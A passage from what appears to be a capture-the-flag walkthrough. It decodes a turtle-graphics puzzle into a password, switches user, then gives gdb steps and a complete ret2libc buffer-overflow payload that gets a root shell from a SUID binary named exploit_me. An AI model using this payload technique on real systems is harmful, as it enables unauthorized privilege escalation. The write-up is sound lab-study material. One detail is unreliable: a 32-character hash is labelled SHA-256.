	Avance 50 spaces
	Avance 1 spaces
	Tourne gauche de 1 degrees
	Avance 1 spaces
	...
	Tourne droite de 1 degrees
	Avance 50 spaces

	Avance 210 spaces
	Recule 210 spaces
	Tourne droite de 90 degrees
	Avance 120 spaces

	Tourne droite de 10 degrees
	Avance 200 spaces
	Tourne droite de 150 degrees
	Avance 200 spaces
	Recule 100 spaces
	Tourne droite de 120 degrees
	Avance 50 spaces

	Tourne gauche de 90 degrees
	Avance 50 spaces
	Avance 1 spaces
	Tourne gauche de 1 degrees
	Avance 1 spaces
	...
	Tourne droite de 1 degrees
	Avance 50 spaces

	Avance 100 spaces
	Recule 200 spaces
	Avance 100 spaces
	Tourne droite de 90 degrees
	Avance 100 spaces
	Tourne droite de 90 degrees
	Avance 100 spaces
	Recule 200 spaces

	Can you digest the message? :)
	```

	> *Note:* The file contains turtle-like commands describing movements and turns. The message at the end hints at decoding or hashing a hidden word.

50. Decoding the Hidden Message

	Write a script to simulate the turtle movements and extract the hidden word. Running the script reveals the word:

	```
	SLASH
	```

51. Hashing the Password

	The turtle's phrase, "Can you digest the message?", suggests hashing the extracted word. Using a hashing algorithm (e.g., SHA-256) on `SLASH` produces the right password:

	```
	646da671ca01bb5d84dbb5fb2238dc8e
	```

52. Switching to User `zaz`

	```bash
	su zaz
	```

	When prompted, enter the hashed password above.

53. Exploring `exploit_me` in User `zaz`'s Home Directory

	```bash
	ls -l
	```

	Output:

	```
	total 5
	-rwsr-s--- 1 root zaz 4880 Oct  8  2015 exploit_me
	drwxr-x--- 3 zaz  zaz  107 Oct  8  2015 mail
	```

	> *Note:* The `exploit_me` executable is owned by `root` and has the SUID bit set, meaning it runs with root privileges. Our goal is to exploit it to execute `system("/bin/sh")` and gain root access.

54. Inspecting the `exploit_me` Executable

	```bash
	file exploit_me
	```

	Result:

	```
	exploit_me: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x2457e2f88d6a21c3893bc48cb8f2584bcd39917e, not stripped
	```

55. Running `exploit_me` with an Argument

	```bash
	./exploit_me test
	```

	Output:

	```
	test
	```

56. Debugging `exploit_me` with GDB

	```bash
	gdb exploit_me
	(gdb) disas main
	```

	Disassembly of `main` function:

	```
	Dump of assembler code for function main:
		0x080483f4 <+0>:	push   %ebp
		0x080483f5 <+1>:	mov    %esp,%ebp
		0x080483f7 <+3>:	and    $0xfffffff0,%esp
		0x080483fa <+6>:	sub    $0x90,%esp
		0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)
		0x08048404 <+16>:	jg     0x804840d <main+25>
		0x08048406 <+18>:	mov    $0x1,%eax
		0x0804840b <+23>:	jmp    0x8048436 <main+66>
		0x0804840d <+25>:	mov    0xc(%ebp),%eax
		0x08048410 <+28>:	add    $0x4,%eax
		0x08048413 <+31>:	mov    (%eax),%eax
		0x08048415 <+33>:	mov    %eax,0x4(%esp)
		0x08048419 <+37>:	lea    0x10(%esp),%eax
		0x0804841d <+41>:	mov    %eax,(%esp)
		0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
		0x08048425 <+49>:	lea    0x10(%esp),%eax
		0x08048429 <+53>:	mov    %eax,(%esp)
		0x0804842c <+56>:	call   0x8048310 <puts@plt>
		0x08048431 <+61>:	mov    $0x0,%eax
		0x08048436 <+66>:	leave  
		0x08048437 <+67>:	ret    
	End of assembler dump.
	```

57. Setting Breakpoint and Running Program

	```gdb
	b main
	run
	```

	Breakpoint hits at main start.

58. Inspecting Addresses of `system` and `exit`

	```gdb
	p system
	p exit
	```

	Outputs:

	```
	$1 = 0xb7e6b060 <system>
	$2 = 0xb7e5ebe0 <exit>
	```

59. Checking Memory Maps

	```gdb
	info proc map
	```

	Shows loaded memory regions, including libc and stack addresses.

60. Finding `/bin/sh` String in Memory

	```gdb
	find 0xb7e2c000,0xb7fcf000,"/bin/sh"
	```

	Found at:

	```
	0xb7f8cc58
	```

61. Constructing the Exploit Payload

	* Stack buffer size: 144 bytes
	* Offset to return address: 140 bytes
	* Overwrite return address with `system()` address (`0xb7e6b060`)
	* Next address: `exit()` (`0xb7e5ebe0`) to safely terminate
	* Argument to `system()`: address of string `"/bin/sh"` (`0xb7f8cc58`)

	Final payload (in bash):

	```bash
	printf 'A%.0s' {1..140}; printf '\x60\xb0\xe6\xb7\xe0\xeb\xe5\xb7\x58\xcc\xf8\xb7'
	```

62. Executing the Exploit

	```bash
	./exploit_me "$(printf 'A%.0s' {1..140}; printf '\x60\xb0\xe6\xb7\xe0\xeb\xe5\xb7\x58\xcc\xf8\xb7')"
	```

	After running, spawn a shell and check privileges:

	```bash
	whoami
	```

	Output:

	```
	root
	```
